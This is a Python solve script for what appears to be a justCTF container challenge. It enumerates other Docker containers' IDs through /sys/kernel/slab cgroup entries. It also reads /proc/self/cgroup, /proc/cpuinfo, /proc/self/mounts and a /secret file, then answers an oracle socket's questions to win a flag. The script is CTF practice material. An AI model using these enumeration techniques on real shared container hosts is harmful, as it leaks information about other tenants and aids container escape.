import sys
import socket
import time
import subprocess
import re

CONTAINER_ID_REGEX = '[a-z0-9]{64}'

with open('/proc/self/cgroup') as f:
    my_container_id = f.read().splitlines()[0].split('docker/')[1]

print("MY CONTAINER ID: %s" % my_container_id)

cpuinfo_lines = open('/proc/cpuinfo').read().splitlines()
cpumodel_line = next(line for line in cpuinfo_lines if 'model name' in line)
cpumodel = cpumodel_line.split(': ')[1].strip()


def get_container_ids():
    data = subprocess.check_output('ls -l /sys/kernel/slab/*/cgroup/', shell=True).decode().splitlines()
    cgroups = set(line.split('(')[-1][:-1].split(':')[1] for line in data if '(' in line and line[-1] == ')')
    return cgroups

def filter_container_ids(iterable):
    return [
        i for i in iterable if re.match(CONTAINER_ID_REGEX, i)
    ]

all_container_ids = filter_container_ids(get_container_ids())

def attempt(target_id):
    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    sock.connect('/oracle.sock')

    print(sock.recv(864))
    sock.sendall((cpumodel + '\n').encode())
    print(sock.recv(len(b'That was easy :)\n[Level 2] What is your *container id*?\n')))
    sock.sendall((my_container_id + '\n').encode())
    print(sock.recv(500))

    time.sleep(1)
    with open('/secret') as f:
        secret = f.read()
    print("READ SECRET: %s" % secret)
    sock.sendall((secret + '\n').encode())
    print(sock.recv(500))

    with open('/proc/self/mounts') as f:
        mounts = f.read().splitlines()
        upperdir = [i for i in mounts if 'upperdir=' in i][0]
        upperdir = upperdir[upperdir.index('upperdir=')+len('upperdir='):]
        upperdir = upperdir.split(',')[0]

    path = upperdir+'/secret'
    print("PATH IS: %s" % path)

    sock.sendall((path + '\n').encode())
    print(sock.recv(500))

    sock.sendall((target_id + '\n').encode())
    print(sock.recv(500))
    sock.sendall((target_id + '\n').encode())
    flag = sock.recv(500)
    if b'justCTF' in flag:
        print(flag)
        sys.exit(0)

for container_id in all_container_ids:
    attempt(container_id)
